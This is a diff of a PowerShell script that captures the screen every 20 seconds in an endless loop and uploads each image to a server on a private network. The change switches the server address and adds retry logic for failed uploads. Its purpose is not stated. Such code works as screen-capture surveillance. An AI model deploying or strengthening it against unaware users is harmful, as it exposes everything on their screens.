@@ -3,9 +3,10 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 # Configuration
-$serverUrl = "http://192.168.1.246:8080/upload"
+$serverUrl = "http://192.168.56.1:8080/upload"
 $interval = 20  # Screenshot interval in seconds
 $maxMemoryStreamSize = 10MB  # Limit memory usage
+$maxRetries = 3  # Number of retries for failed uploads
 
 while ($true) {
     try {
@@ -40,7 +41,25 @@ while ($true) {
                     "--$boundary--"
                 ) -join $LF
                 
-                Invoke-RestMethod -Uri $serverUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+                # Send to server with retry logic
+                $retryCount = 0
+                $success = $false
+                
+                while (-not $success -and $retryCount -lt $maxRetries) {
+                    try {
+                        $result = Invoke-RestMethod -Uri $serverUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -TimeoutSec 30
+                        $success = $true
+                    }
+                    catch {
+                        $retryCount++
+                        if ($retryCount -lt $maxRetries) {
+                            Start-Sleep -Seconds 5
+                        }
+                        else {
+                            Write-Error "Failed to upload screenshot after $maxRetries attempts."
+                        }
+                    }
+                }
             }
         }
         finally {
